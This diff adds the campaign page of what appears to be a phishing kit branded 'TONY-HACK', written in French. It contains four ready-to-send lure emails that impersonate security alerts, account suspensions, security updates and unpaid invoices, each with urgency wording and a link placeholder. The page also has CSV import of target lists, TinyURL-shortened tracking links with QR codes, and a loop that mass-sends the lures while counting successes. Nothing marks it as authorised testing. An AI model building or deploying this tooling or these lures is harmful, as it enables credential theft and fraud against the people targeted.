@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TONY-HACK | Campagnes</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="sidebar">
+        <div class="sidebar-header"><h2>TONY-HACK</h2></div>
+        <div class="sidebar-user">
+            <div class="avatar"><i class="fas fa-user-shield"></i></div>
+            <div class="user-info"><h4>{{ session.get('user', 'admin') }}</h4><p>Administrateur</p></div>
+        </div>
+        <div class="sidebar-nav">
+            <a href="/" class="nav-item"><i class="fas fa-home"></i><span>Dashboard</span></a>
+            <a href="/campaigns" class="nav-item active"><i class="fas fa-bullhorn"></i><span>Campagnes</span></a>
+            <a href="/templates" class="nav-item"><i class="fas fa-file-code"></i><span>Templates</span></a>
+            <a href="/builder" class="nav-item"><i class="fas fa-code"></i><span>Builder</span></a>
+            <a href="/logs" class="nav-item"><i class="fas fa-list"></i><span>Logs</span></a>
+            <a href="/statistics" class="nav-item"><i class="fas fa-chart-bar"></i><span>Statistiques</span></a>
+            <a href="/settings" class="nav-item"><i class="fas fa-cog"></i><span>Paramètres</span></a>
+            <a href="/profile" class="nav-item"><i class="fas fa-user-circle"></i><span>Profil</span></a>
+        </div>
+        <div class="sidebar-footer">
+            <a href="/logout" class="nav-item" onclick="return confirm('Déconnexion ?')"><i class="fas fa-sign-out-alt"></i><span>Déconnexion</span></a>
+        </div>
+    </div>
+    
+    <div class="main-content">
+        <div class="page-header">
+            <h1 class="page-title">Campagnes <span>Phishing</span></h1>
+            <button class="btn btn-primary" onclick="openNewCampaignModal()">
+                <i class="fas fa-plus"></i> Nouvelle Campagne
+            </button>
+        </div>
+        
+        <!-- Stats Campagnes -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-bullhorn"></i></div>
+                <div class="stat-info">
+                    <h3>Total Campagnes</h3>
+                    <div class="value" id="totalCampaigns">0</div>
+                </div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-envelope"></i></div>
+                <div class="stat-info">
+                    <h3>Emails Envoyés</h3>
+                    <div class="value" id="totalEmailsSent">0</div>
+                </div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-check-circle"></i></div>
+                <div class="stat-info">
+                    <h3>Taux de Succès</h3>
+                    <div class="value" id="successRate">0%</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Formulaire Campagne -->
+        <div class="card" id="campaignForm" style="display: none;">
+            <div class="card-header">
+                <h3><i class="fas fa-paper-plane"></i> Nouvelle Campagne</h3>
+                <button class="btn btn-secondary btn-sm" onclick="hideCampaignForm()">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            
+            <form id="newCampaignForm">
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                    <div>
+                        <div class="form-group">
+                            <label>Nom de la campagne</label>
+                            <input type="text" name="campaign_name" placeholder="Ex: Campagne Facebook Mars 2024" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Template à utiliser</label>
+                            <select name="template_id" id="templateSelect" required>
+                                <option value="">-- Sélectionner un template --</option>
+                                {% for template in templates %}
+                                <option value="{{ template.id }}">{{ template.name }} ({{ template.type }})</option>
+                                {% endfor %}
+                            </select>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Sujet de l'email</label>
+                            <select name="email_subject" id="emailSubject" onchange="updateEmailTemplate()">
+                                <option value="Alerte de sécurité importante">🔒 Alerte de sécurité importante</option>
+                                <option value="Votre compte a été suspendu">⚠️ Votre compte a été suspendu</option>
+                                <option value="Mise à jour de sécurité requise">🔄 Mise à jour de sécurité requise</option>
+                                <option value="Facture en attente de paiement">💰 Facture en attente de paiement</option>
+                                <option value="Action requise sur votre compte">📧 Action requise sur votre compte</option>
+                            </select>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Template Email</label>
+                            <select name="email_template_type" id="emailTemplateType" onchange="updateEmailTemplate()">
+                                <option value="alerte">Alerte Sécurité</option>
+                                <option value="suspendu">Compte Suspendu</option>
+                                <option value="miseajour">Mise à jour</option>
+                                <option value="facture">Facture</option>
+                            </select>
+                        </div>
+                    </div>
+                    
+                    <div>
+                        <div class="form-group">
+                            <label>Corps de l'email (HTML)</label>
+                            <textarea name="email_body" id="emailBody" rows="12" style="font-family: monospace;"></textarea>
+                            <small style="color: var(--text-secondary);">
+                                Variables: {{ '{{nom}}' }}, {{ '{{email}}' }}, {{ '{{lien}}' }}
+                            </small>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Liste des cibles</label>
+                    <div style="display: flex; gap: 10px; margin-bottom: 10px;">
+                        <input type="file" id="csvFile" accept=".csv" style="display: none;" onchange="loadCSVFile(this)">
+                        <button type="button" class="btn btn-secondary" onclick="document.getElementById('csvFile').click()">
+                            <i class="fas fa-upload"></i> Importer CSV
+                        </button>
+                        <button type="button" class="btn btn-secondary" onclick="addTargetRow()">
+                            <i class="fas fa-plus"></i> Ajouter manuellement
+                        </button>
+                    </div>
+                    
+                    <div class="table-container" style="max-height: 200px; overflow-y: auto;">
+                        <table>
+                            <thead>
+                                <tr><th>Nom</th><th>Email</th><th>Action</th></tr>
+                            </thead>
+                            <tbody id="targetsList">
+                                <tr id="noTargetsRow"><td colspan="3" style="text-align: center;">Aucune cible</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Options de Tracking</label>
+                    <div style="display: flex; gap: 20px;">
+                        <label class="toggle">
+                            <input type="checkbox" name="shorten_url" checked>
+                            <span class="toggle-switch"></span>
+                            <span>Raccourcir l'URL</span>
+                        </label>
+                        <label class="toggle">
+                            <input type="checkbox" name="generate_qr" checked>
+                            <span class="toggle-switch"></span>
+                            <span>Générer QR Code</span>
+                        </label>
+                    </div>
+                </div>
+                
+                <div id="trackingPreview" style="display: none; margin-top: 20px; padding: 16px; background: var(--bg-dark); border-radius: 8px;">
+                    <h4 style="margin-bottom: 12px;">Aperçu du lien de tracking</h4>
+                    <div style="display: flex; align-items: center; gap: 12px;">
+                        <code id="trackingUrlPreview" style="flex: 1; padding: 8px; background: var(--bg-card); border-radius: 4px;"></code>
+                        <button type="button" class="btn btn-secondary btn-sm" onclick="copyTrackingUrl()">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                    </div>
+                    <div id="qrCodePreview" style="margin-top: 16px; text-align: center;"></div>
+                </div>
+                
+                <div class="modal-footer" style="margin-top: 24px;">
+                    <button type="button" class="btn btn-secondary" onclick="hideCampaignForm()">Annuler</button>
+                    <button type="button" class="btn btn-primary" onclick="previewCampaign()">
+                        <i class="fas fa-eye"></i> Aperçu
+                    </button>
+                    <button type="submit" class="btn btn-success" style="background: #238636;">
+                        <i class="fas fa-paper-plane"></i> Lancer la campagne
+                    </button>
+                </div>
+            </form>
+        </div>
+        
+        <!-- Liste des campagnes -->
+        <div class="card">
+            <div class="card-header">
+                <h3><i class="fas fa-history"></i> Historique des campagnes</h3>
+            </div>
+            
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Nom</th>
+                            <th>Template</th>
+                            <th>Cibles</th>
+                            <th>Envoyés</th>
+                            <th>Statut</th>
+                            <th>Date</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="campaignsBody">
+                        <tr><td colspan="7" style="text-align: center;">Chargement...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Modal d'envoi -->
+    <div class="modal-overlay" id="sendingModal" style="display: none;">
+        <div class="modal">
+            <div class="modal-header">
+                <h3><i class="fas fa-spinner fa-spin"></i> Envoi en cours...</h3>
+            </div>
+            <div id="sendingProgress">
+                <div class="progress" style="margin: 20px 0;">
+                    <div class="progress-bar" id="progressBar" style="width: 0%;"></div>
+                </div>
+                <p id="progressText">Préparation de l'envoi...</p>
+                <div id="sendingStats" style="margin-top: 16px;">
+                    <span>✅ Succès: <span id="successCount">0</span></span>
+                    <span style="margin-left: 16px;">❌ Échecs: <span id="failCount">0</span></span>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="toast-container" id="toastContainer"></div>
+    
+    <script>
+        let campaigns = [];
+        let targets = [];
+        let currentTrackingUrl = '';
+        
+        const emailTemplates = {
+            alerte: {
+                subject: 'Alerte de sécurité importante',
+                body: `<!DOCTYPE html><html><head><style>body{font-family:Arial,sans-serif;background:#f5f5f5;margin:0;padding:20px}.container{max-width:600px;margin:0 auto;background:white;border-radius:8px;padding:30px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}.header{color:#e94560;font-size:24px;margin-bottom:20px}.btn{display:inline-block;padding:12px 24px;background:#e94560;color:white;text-decoration:none;border-radius:6px;margin:20px 0}.footer{color:#666;font-size:12px;margin-top:30px;border-top:1px solid #eee;padding-top:20px}</style></head><body><div class="container"><div class="header">⚠️ Alerte de Sécurité</div><p>Bonjour {{nom}},</p><p>Nous avons détecté une activité suspecte sur votre compte. Pour des raisons de sécurité, veuillez vérifier votre compte immédiatement.</p><a href="{{lien}}" class="btn">Vérifier mon compte</a><p>Si vous n'avez pas demandé cette vérification, veuillez ignorer cet email.</p><div class="footer">Cet email a été envoyé à {{email}}<br>© 2024 Équipe de Sécurité</div></div></body></html>`
+            },
+            suspendu: {
+                subject: 'Votre compte a été suspendu',
+                body: `<!DOCTYPE html><html><head><style>body{font-family:Arial,sans-serif;background:#f5f5f5;margin:0;padding:20px}.container{max-width:600px;margin:0 auto;background:white;border-radius:8px;padding:30px}.header{color:#d32f2f;font-size:24px;margin-bottom:20px}.btn{display:inline-block;padding:12px 24px;background:#d32f2f;color:white;text-decoration:none;border-radius:6px;margin:20px 0}</style></head><body><div class="container"><div class="header">🚫 Compte Suspendu</div><p>Bonjour {{nom}},</p><p>Votre compte a été temporairement suspendu en raison d'activités inhabituelles. Pour réactiver votre compte, veuillez confirmer votre identité.</p><a href="{{lien}}" class="btn">Réactiver mon compte</a><p>Cette action est requise dans les 24 heures pour éviter la suppression permanente.</p></div></body></html>`
+            },
+            miseajour: {
+                subject: 'Mise à jour de sécurité requise',
+                body: `<!DOCTYPE html><html><head><style>body{font-family:Arial,sans-serif;background:#f5f5f5;margin:0;padding:20px}.container{max-width:600px;margin:0 auto;background:white;border-radius:8px;padding:30px}.header{color:#1976d2;font-size:24px;margin-bottom:20px}.btn{display:inline-block;padding:12px 24px;background:#1976d2;color:white;text-decoration:none;border-radius:6px;margin:20px 0}</style></head><body><div class="container"><div class="header">🔄 Mise à jour de sécurité</div><p>Bonjour {{nom}},</p><p>Une mise à jour de sécurité importante est disponible pour votre compte. Veuillez vous connecter pour appliquer cette mise à jour.</p><a href="{{lien}}" class="btn">Mettre à jour maintenant</a></div></body></html>`
+            },
+            facture: {
+                subject: 'Facture en attente de paiement',
+                body: `<!DOCTYPE html><html><head><style>body{font-family:Arial,sans-serif;background:#f5f5f5;margin:0;padding:20px}.container{max-width:600px;margin:0 auto;background:white;border-radius:8px;padding:30px}.header{color:#ff9800;font-size:24px;margin-bottom:20px}.btn{display:inline-block;padding:12px 24px;background:#ff9800;color:white;text-decoration:none;border-radius:6px;margin:20px 0}</style></head><body><div class="container"><div class="header">💰 Facture en attente</div><p>Bonjour {{nom}},</p><p>Vous avez une facture impayée de 49,99€. Veuillez régulariser votre situation dans les plus brefs délais.</p><a href="{{lien}}" class="btn">Voir la facture</a></div></body></html>`
+            }
+        };
+        
+        function showToast(title, message, type = 'info') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            let icon = type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle';
+            toast.innerHTML = `<i class="fas fa-${icon}"></i><div class="toast-content"><div class="toast-title">${title}</div><div class="toast-message">${message}</div></div>`;
+            container.appendChild(toast);
+            setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 4000);
+        }
+        
+        function openNewCampaignModal() {
+            document.getElementById('campaignForm').style.display = 'block';
+        }
+        
+        function hideCampaignForm() {
+            document.getElementById('campaignForm').style.display = 'none';
+        }
+        
+        function updateEmailTemplate() {
+            const type = document.getElementById('emailTemplateType').value;
+            const template = emailTemplates[type];
+            if (template) {
+                document.getElementById('emailSubject').value = template.subject;
+                document.getElementById('emailBody').value = template.body;
+            }
+        }
+        
+        function addTargetRow() {
+            const name = prompt('Nom de la cible:');
+            if (!name) return;
+            const email = prompt('Email de la cible:');
+            if (!email) return;
+            
+            targets.push({ name, email });
+            renderTargetsList();
+        }
+        
+        function renderTargetsList() {
+            const tbody = document.getElementById('targetsList');
+            
+            if (targets.length === 0) {
+                tbody.innerHTML = '<tr id="noTargetsRow"><td colspan="3" style="text-align: center;">Aucune cible</td></tr>';
+                return;
+            }
+            
+            tbody.innerHTML = targets.map((t, i) => `
+                <tr>
+                    <td>${t.name}</td>
+                    <td>${t.email}</td>
+                    <td>
+                        <button class="btn btn-danger btn-sm" onclick="removeTarget(${i})">
+                            <i class="fas fa-trash"></i>
+                        </button>
+                    </td>
+                </tr>
+            `).join('');
+        }
+        
+        function removeTarget(index) {
+            targets.splice(index, 1);
+            renderTargetsList();
+        }
+        
+        function loadCSVFile(input) {
+            const file = input.files[0];
+            if (!file) return;
+            
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                const lines = e.target.result.split('\n');
+                lines.forEach(line => {
+                    const parts = line.split(',').map(p => p.trim());
+                    if (parts.length >= 2 && parts[1].includes('@')) {
+                        targets.push({ name: parts[0], email: parts[1] });
+                    }
+                });
+                renderTargetsList();
+                showToast('CSV Importé', `${targets.length} cibles chargées`, 'success');
+            };
+            reader.readAsText(file);
+        }
+        
+        async function previewCampaign() {
+            const templateId = document.getElementById('templateSelect').value;
+            if (!templateId) {
+                showToast('Erreur', 'Veuillez sélectionner un template', 'error');
+                return;
+            }
+            
+            if (targets.length === 0) {
+                showToast('Erreur', 'Veuillez ajouter au moins une cible', 'error');
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/shorten-url', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        url: `${window.location.origin}/t/${templateId}?ref=${btoa(targets[0].name)}`,
+                        service: 'tinyurl'
+                    })
+                });
+                
+                const data = await response.json();
+                currentTrackingUrl = data.short_url;
+                
+                document.getElementById('trackingUrlPreview').textContent = currentTrackingUrl;
+                document.getElementById('qrCodePreview').innerHTML = `
+                    <img src="data:image/png;base64,${data.qr_code}" style="width: 150px; height: 150px;">
+                    <br><a href="data:image/png;base64,${data.qr_code}" download="qrcode.png" class="btn btn-secondary btn-sm">Télécharger QR</a>
+                `;
+                document.getElementById('trackingPreview').style.display = 'block';
+                
+                showToast('Aperçu', 'Lien de tracking généré', 'success');
+            } catch (e) {
+                showToast('Erreur', 'Impossible de générer le lien', 'error');
+            }
+        }
+        
+        function copyTrackingUrl() {
+            navigator.clipboard.writeText(currentTrackingUrl);
+            showToast('Copié !', 'URL copiée dans le presse-papiers', 'success');
+        }
+        
+        async function loadCampaigns() {
+            try {
+                const response = await fetch('/api/campaigns');
+                campaigns = await response.json();
+                renderCampaigns();
+                updateCampaignStats();
+            } catch (e) {
+                console.error('Erreur:', e);
+            }
+        }
+        
+        function renderCampaigns() {
+            const tbody = document.getElementById('campaignsBody');
+            
+            if (campaigns.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="7" style="text-align: center;">Aucune campagne</td></tr>';
+                return;
+            }
+            
+            tbody.innerHTML = campaigns.map(c => `
+                <tr>
+                    <td>${c.name}</td>
+                    <td>${c.template_id}</td>
+                    <td>${c.targets?.length || 0}</td>
+                    <td>${c.sent_count || 0}</td>
+                    <td><span class="badge badge-${c.status === 'sent' ? 'success' : 'warning'}">${c.status}</span></td>
+                    <td>${c.created_at?.slice(0,10) || '-'}</td>
+                    <td>
+                        <div class="flex gap-2">
+                            <button class="btn btn-secondary btn-sm" onclick="viewCampaign('${c.id}')">
+                                <i class="fas fa-eye"></i>
+                            </button>
+                            <button class="btn btn-danger btn-sm" onclick="deleteCampaign('${c.id}')">
+                                <i class="fas fa-trash"></i>
+                            </button>
+                        </div>
+                    </td>
+                </tr>
+            `).join('');
+        }
+        
+        function updateCampaignStats() {
+            document.getElementById('totalCampaigns').textContent = campaigns.length;
+            const totalSent = campaigns.reduce((sum, c) => sum + (c.sent_count || 0), 0);
+            document.getElementById('totalEmailsSent').textContent = totalSent;
+            const totalSuccess = campaigns.reduce((sum, c) => sum + (c.success_count || 0), 0);
+            const rate = totalSent > 0 ? Math.round((totalSuccess / totalSent) * 100) : 0;
+            document.getElementById('successRate').textContent = rate + '%';
+        }
+        
+        document.getElementById('newCampaignForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            if (targets.length === 0) {
+                showToast('Erreur', 'Veuillez ajouter des cibles', 'error');
+                return;
+            }
+            
+            const formData = new FormData(e.target);
+            
+            const campaignData = {
+                name: formData.get('campaign_name'),
+                template_id: formData.get('template_id'),
+                targets: targets,
+                email_template: {
+                    subject: formData.get('email_subject'),
+                    body: formData.get('email_body')
+                },
+                tracking_url: currentTrackingUrl
+            };
+            
+            try {
+                // Créer la campagne
+                const response = await fetch('/api/campaigns', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(campaignData)
+                });
+                
+                const campaign = await response.json();
+                
+                // Afficher le modal d'envoi
+                document.getElementById('sendingModal').style.display = 'flex';
+                
+                // Envoyer les emails
+                await sendEmails(campaign.id, campaignData);
+                
+            } catch (error) {
+                showToast('Erreur', 'Échec de la campagne', 'error');
+                document.getElementById('sendingModal').style.display = 'none';
+            }
+        });
+        
+        async function sendEmails(campaignId, campaignData) {
+            const totalTargets = targets.length;
+            let successCount = 0;
+            let failCount = 0;
+            
+            for (let i = 0; i < targets.length; i++) {
+                const target = targets[i];
+                
+                try {
+                    const response = await fetch('/api/send-emails', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            campaign_id: campaignId,
+                            targets: [target],
+                            subject: campaignData.email_template.subject,
+                            body: campaignData.email_template.body,
+                            tracking_url: campaignData.tracking_url
+                        })
+                    });
+                    
+                    const result = await response.json();
+                    successCount += result.success;
+                    failCount += result.failed;
+                    
+                    // Mettre à jour la progression
+                    const progress = ((i + 1) / totalTargets) * 100;
+                    document.getElementById('progressBar').style.width = progress + '%';
+                    document.getElementById('progressText').textContent = 
+                        `Envoi ${i + 1}/${totalTargets} - ${target.email}`;
+                    document.getElementById('successCount').textContent = successCount;
+                    document.getElementById('failCount').textContent = failCount;
+                    
+                    // Petit délai entre les envois
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                    
+                } catch (e) {
+                    failCount++;
+                    document.getElementById('failCount').textContent = failCount;
+                }
+            }
+            
+            // Terminé
+            document.getElementById('sendingModal').style.display = 'none';
+            showToast('Campagne terminée', `${successCount} emails envoyés avec succès`, 'success');
+            
+            hideCampaignForm();
+            loadCampaigns();
+            
+            // Reset
+            targets = [];
+            document.getElementById('newCampaignForm').reset();
+            document.getElementById('trackingPreview').style.display = 'none';
+        }
+        
+        document.addEventListener('DOMContentLoaded', () => {
+            loadCampaigns();
+            updateEmailTemplate();
+        });
+    </script>
+</body>
+</html>
